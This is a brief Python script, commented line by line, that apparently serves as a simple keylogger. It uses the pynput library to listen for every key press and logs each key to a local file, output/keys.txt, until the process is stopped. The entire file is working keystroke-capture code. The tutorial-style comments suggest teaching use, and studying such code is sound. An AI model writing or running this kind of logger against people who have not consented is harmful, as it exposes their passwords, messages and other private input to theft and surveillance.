# Imports the Listener class from the pynput library, which monitors keyboard input.
from pynput.keyboard import Listener

# Imports Python's built-in logging module, used here to write keystrokes to a file.
import logging


# Configures logging to:
# - Write to output/keys.txt
# - Log at DEBUG level (captures everything)
# - Store only the message (the key itself), discarding timestamps and log levels

logging.basicConfig(filename="output/keys.txt", level=logging.DEBUG, format="%(message)s")


# Creates a keyboard listener. 
# On every key press, the lambda function converts 
# the key object to a string and logs it. 
# The with statement ensures proper cleanup.

with Listener(on_press=lambda key: logging.info(str(key))) as listener:
    # Blocks the main thread so the listener runs indefinitely 
    # until the process is killed (e.g., Ctrl+C).
    listener.join()
